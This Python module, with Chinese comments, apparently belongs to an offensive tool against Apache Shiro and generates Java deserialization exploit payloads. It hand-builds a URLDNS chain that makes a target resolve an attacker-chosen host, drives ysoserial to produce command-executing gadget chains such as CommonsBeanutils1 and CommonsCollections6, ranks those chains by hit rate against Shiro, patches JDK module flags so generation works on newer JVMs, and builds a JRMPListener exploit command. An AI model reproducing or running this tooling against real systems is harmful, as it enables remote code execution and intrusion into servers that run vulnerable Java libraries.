#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""反序列化 payload 生成：内置 URLDNS + ysoserial 桥接。

设计原则：
    * **可离线**：URLDNS 链用纯 Python 直接拼序列化字节流，不需要 ysoserial，
      也不需要目标机器有 JDK；
    * **可扩展**：本机存在 ysoserial.jar 时调用它生成 CB1/CC6 等真正能执行命令的
      gadget（这些链依赖目标 classpath 上的第三方库，无法凭空伪造）；
    * **不猜名字**：gadget 是否被 ysoserial 支持，通过解析 ysoserial 的用法输出来
      确认，避免拼错的类名导致静默失败；
    * **兼容新 JDK**：ysoserial 0.0.6 在 JDK 9+ 上需要 ``--add-opens`` /
      ``--add-exports``，这里按本机 JDK 版本自动补齐，免去手工拼参数。
"""

from __future__ import annotations

import os
import re
import shutil
import subprocess
from dataclasses import dataclass, field
from functools import lru_cache

from . import jserial
from .jserial import JObject, JavaWriter


# 每个 gadget 的说明：依赖 / 适用场景（ysoserial 输出里没有依赖信息时兜底）
GADGET_ALIASES = {
    "CB1": "CommonsBeanutils1",
    "CB183": "CommonsBeanutils1",
    "CC1": "CommonsCollections1",
    "CC2": "CommonsCollections2",
    "CC3": "CommonsCollections3",
    "CC4": "CommonsCollections4",
    "CC5": "CommonsCollections5",
    "CC6": "CommonsCollections6",
    "CC7": "CommonsCollections7",
    "ROME": "ROME",
    "SPRING1": "Spring1",
    "SPRING2": "Spring2",
    "JRMPCLIENT": "JRMPClient",
    "JRMPLISTENER": "JRMPListener",
    "JDK7U21": "Jdk7u21",
    "BEANSHELL1": "BeanShell1",
    "HIBERNATE1": "Hibernate1",
    "HIBERNATE2": "Hibernate2",
    "MOZILLARHINO1": "MozillaRhino1",
    "MOZILLARHINO2": "MozillaRhino2",
    "GROOVY1": "Groovy1",
    "URLDNS": "URLDNS",
}

GADGET_DEPS = {
    "CommonsBeanutils1": "commons-beanutils + commons-collections（Shiro 首选）",
    "CommonsCollections1": "commons-collections 3.1（JDK 8u71 之前）",
    "CommonsCollections2": "commons-collections4 4.x + javassist",
    "CommonsCollections3": "commons-collections 3.1",
    "CommonsCollections4": "commons-collections4 4.x",
    "CommonsCollections5": "commons-collections 3.1（BadAttributeValueExpException）",
    "CommonsCollections6": "commons-collections 3.1（最稳）",
    "CommonsCollections7": "commons-collections 3.1（Hashtable）",
    "ROME": "rome",
    "Spring1": "spring-core + spring-beans",
    "Spring2": "spring-aop + spring-beans",
    "JRMPClient": "纯 JDK；配合 JRMPListener，用于不出网场景",
    "JRMPListener": "ysoserial 自带的 JRMP 服务端",
    "Jdk7u21": "纯 JDK；仅 JDK ≤ 7u21 / 8u20",
    "URLDNS": "纯 JDK；只做 DNS 探测，不能执行命令",
}

# 推荐尝试顺序（Shiro 环境下命中率从高到低）
GADGET_PRIORITY = ["CB1", "CC6", "CC5", "CC3", "CC7", "ROME", "SPRING1", "SPRING2"]

# ysoserial 0.0.6 在 JDK 9+ 上生成 TemplatesImpl / URLDNS 链所需的模块参数
JVM_MODULE_FLAGS = [
    "--add-opens", "java.base/java.net=ALL-UNNAMED",
    "--add-opens", "java.base/java.lang=ALL-UNNAMED",
    "--add-opens", "java.base/java.util=ALL-UNNAMED",
    "--add-opens", "java.base/java.io=ALL-UNNAMED",
    "--add-opens", "java.base/java.lang.reflect=ALL-UNNAMED",
    "--add-opens", "java.rmi/sun.rmi.server=ALL-UNNAMED",
    "--add-opens", "java.rmi/sun.rmi.transport=ALL-UNNAMED",
    "--add-opens", "java.rmi/sun.rmi.transport.tcp=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
    "--add-opens", "java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xalan.internal.xsltc.dom=ALL-UNNAMED",
    "--add-exports", "java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED",
]


class PayloadError(RuntimeError):
    pass


# --------------------------------------------------------------------------- #
# 内置 URLDNS（唯一纯 Python、无需第三方库的命令无关探测链）
# --------------------------------------------------------------------------- #


def url_dns_payload(host: str, port: int = -1, protocol: str = "http") -> bytes:
    """生成 URLDNS payload：反序列化时会解析 ``host``，用于无回显的密钥探测。"""
    if not host or any(c in host for c in "/:@ \t\r\n"):
        raise PayloadError(f"URLDNS 的 host 不合法: {host!r}")
    url_text = f"{protocol}://{host}{'' if port in (-1, None) else ':' + str(port)}/x"
    url_obj = JObject(
        jserial.URL_DESC,
        {
            "hashCode": -1,
            "port": -1 if port in (-1, None) else port,
            "authority": host,
            "file": "/x",
            "host": host,
            "protocol": protocol,
            "ref": None,
        },
    )

    def _custom(writer: JavaWriter) -> None:
        # HashMap.writeObject: capacity(int) + size(int) 放在一个 BLOCKDATA 里
        writer.blockdata((16).to_bytes(4, "big") + (1).to_bytes(4, "big"))
        writer.write_value(url_obj)          # key：URL
        writer.write_string(url_text)        # value：任意可序列化对象

    payload = JObject(jserial.HASHMAP_DESC, {"loadFactor": 0.75, "threshold": 12},
                      custom_writer=_custom)
    writer = JavaWriter()
    writer.write_object(payload)
    return writer.bytes()


# --------------------------------------------------------------------------- #
# Java / ysoserial 环境探测
# --------------------------------------------------------------------------- #


@lru_cache(maxsize=None)
def java_major(java: str) -> int:
    """返回 java 主版本号（8/11/17/26…）；解析失败按 8 处理。"""
    try:
        proc = subprocess.run([java, "-version"], capture_output=True, timeout=30)
        text = (proc.stderr or b"").decode("utf-8", "replace") + \
               (proc.stdout or b"").decode("utf-8", "replace")
        match = re.search(r'version "(\d+)(?:\.(\d+))?', text)
        if match:
            major = int(match.group(1))
            if major == 1 and match.group(2):
                return int(match.group(2))
            return major
    except Exception:  # noqa: BLE001
        pass
    return 8


def jvm_module_flags(java: str) -> list[str]:
    """JDK 9+ 才需要、也只接受模块参数。"""
    return list(JVM_MODULE_FLAGS) if java_major(java) >= 9 else []


def find_java() -> str | None:
    for env in ("SHIROKIT_JAVA", "JAVA_HOME"):
        value = os.environ.get(env)
        if not value:
            continue
        for name in ("java.exe", "java"):
            candidate = os.path.join(value, "bin", name)
            if os.path.isfile(candidate):
                return candidate
    return shutil.which("java")


def find_ysoserial(start_dirs: list[str] | None = None) -> str | None:
    """在常见位置查找 ysoserial jar（支持 ``../ysoserial/*.jar``）。"""
    import glob

    candidates: list[str] = []
    env = os.environ.get("YSOSERIAL_JAR")
    if env:
        candidates.append(env)
    here = os.path.dirname(os.path.abspath(__file__))
    project = os.path.dirname(here)
    roots = [project, here, os.getcwd(), os.path.dirname(project)]
    roots += start_dirs or []
    seen_roots: set[str] = set()
    for root in roots:
        if not root or not os.path.isdir(root):
            continue
        root = os.path.abspath(root)
        if root in seen_roots:
            continue
        seen_roots.add(root)
        patterns = [
            "ysoserial*.jar", "ysoserial/*.jar", "ysoserial/**/*.jar",
            "tools/ysoserial/*.jar", "tools/*.jar",
        ]
        for pattern in patterns:
            candidates.extend(glob.glob(os.path.join(root, pattern),
                                        recursive="**" in pattern))
        if os.path.basename(root) != "ysoserial":
            candidates.extend(glob.glob(os.path.join(root, "..", "ysoserial", "*.jar")))
    for path in candidates:
        if os.path.isfile(path) and os.path.getsize(path) > 1024:
            return os.path.abspath(path)
    return None


@dataclass
class YsoserialInfo:
    path: str
    java: str
    payloads: list[str]
    authors: dict[str, str] = field(default_factory=dict)
    deps: dict[str, str] = field(default_factory=dict)
    java_major: int = 8

    def resolve(self, gadget: str) -> str:
        """把 CB1/CC6 这类别名解析成 ysoserial 真实 payload 名。"""
        g = (gadget or "").strip()
        if g.upper() in GADGET_ALIASES:
            g = GADGET_ALIASES[g.upper()]
        for name in self.payloads:
            if name.lower() == g.lower():
                return name
        raise PayloadError(
            f"ysoserial 不支持 payload {gadget!r}；可用: {', '.join(self.payloads)}"
        )

    def dependency(self, name: str) -> str:
        return self.deps.get(name) or GADGET_DEPS.get(name, "")


def _parse_payload_table(text: str) -> tuple[list[str], dict[str, str], dict[str, str]]:
    payloads: list[str] = []
    authors: dict[str, str] = {}
    deps: dict[str, str] = {}
    skip = {"payload", "authors", "dependencies", "usage", "available", "y"}
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith(("-", "Y SO", "Usage", "java ")):
            continue
        if "Payload" in line and "Authors" in line:
            continue
        columns = re.split(r"\s{2,}", line)
        name = columns[0].strip()
        if not re.fullmatch(r"[A-Za-z][A-Za-z0-9]*", name) or name.lower() in skip:
            continue
        payloads.append(name)
        if len(columns) > 1:
            authors[name] = columns[1].strip()
        if len(columns) > 2:
            deps[name] = " ".join(columns[2:]).strip()
    return payloads, authors, deps


@lru_cache(maxsize=8)
def _probe_cached(jar: str, java: str) -> tuple:
    if not os.path.isfile(jar):
        raise PayloadError(f"ysoserial.jar 不存在: {jar}")
    if not os.path.isfile(java):
        java = find_java() or ""
    if not java:
        raise PayloadError("未找到 java，无法使用 ysoserial")
    cmd = [java, *jvm_module_flags(java), "-jar", jar]
    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=120)
    except Exception as exc:  # noqa: BLE001
        raise PayloadError(f"无法执行 ysoserial: {exc}") from exc
    text = (proc.stdout or b"").decode("utf-8", "replace") + \
           (proc.stderr or b"").decode("utf-8", "replace")
    payloads, authors, deps = _parse_payload_table(text)
    if not payloads:
        raise PayloadError(
            "解析 ysoserial payload 列表失败（jar 是否完整？）\n"
            + text[-600:])
    return tuple(payloads), tuple(authors.items()), tuple(deps.items())


def probe_ysoserial(jar: str, java: str | None = None) -> YsoserialInfo:
    """执行 ysoserial 并根据输出解析支持的 payload、作者与依赖。"""
    java = java or find_java()
    if not java:
        raise PayloadError("未找到 java，无法使用 ysoserial")
    payloads, authors, deps = _probe_cached(os.path.abspath(jar), java)
    return YsoserialInfo(path=os.path.abspath(jar), java=java,
                         payloads=list(payloads), authors=dict(authors),
                         deps=dict(deps), java_major=java_major(java))


def _translate_error(stderr: str) -> str:
    text = stderr.strip()
    hints = []
    if "InaccessibleObjectException" in text:
        hints.append("JDK 模块访问限制：工具已尝试自动加 --add-opens，"
                     "仍失败可改用 JDK 8 生成 payload")
    if "IllegalAccessError" in text and "java.xml" in text:
        hints.append("TemplatesImpl 位于 java.xml 模块：确认 JDK 9+ 的 "
                     "--add-exports 已生效")
    if "UnsupportedClassVersionError" in text:
        hints.append("本机 JDK 版本低于 ysoserial 编译版本，请升级 JDK")
    if "NoClassDefFoundError" in text:
        hints.append("可能不是 -all 版本 jar（缺少 gadget 依赖库）")
    if "java.lang.ClassNotFoundException" in text:
        hints.append("缺少 gadget 依赖类，换一条链或使用 ysoserial-all.jar")
    if not hints:
        hints.append("可先用 `payload list` 确认 jar 可用；或改用 --payload-file")
    return text.splitlines()[0][:300] if text else "空输出"


@lru_cache(maxsize=64)
def _generate_cached(jar: str, java: str, gadget: str, command: str) -> bytes:
    cmd = [java, *jvm_module_flags(java), "-jar", jar, gadget, command]
    try:
        proc = subprocess.run(cmd, capture_output=True, timeout=120)
    except Exception as exc:  # noqa: BLE001
        raise PayloadError(f"运行 ysoserial 失败: {exc}") from exc
    data = proc.stdout or b""
    if not data.startswith(b"\xac\xed\x00\x05"):
        raise PayloadError("ysoserial 生成失败: " + _translate_error(
            (proc.stderr or b"").decode("utf-8", "replace")))
    return data


def ysoserial_payload(jar: str, gadget: str, command: str,
                      java: str | None = None, timeout: int = 120) -> bytes:
    """调用 ysoserial 生成 payload（自动适配 JDK 9+ 的模块参数）。"""
    java = java or find_java()
    if not java:
        raise PayloadError("未找到 java，无法运行 ysoserial")
    return _generate_cached(os.path.abspath(jar), java, gadget, command)


def jrmp_listener_command(jar: str, java: str, port: int, gadget: str,
                          command: str) -> list[str]:
    """JRMPListener 是 ysoserial 的 exploit 类，必须用 -cp 调用，不能 -jar。"""
    return [java, *jvm_module_flags(java), "-cp", os.path.abspath(jar),
            "ysoserial.exploit.JRMPListener", str(port), gadget, command]


def write_payload(path: str, data: bytes) -> str:
    with open(path, "wb") as fh:
        fh.write(data)
    return path
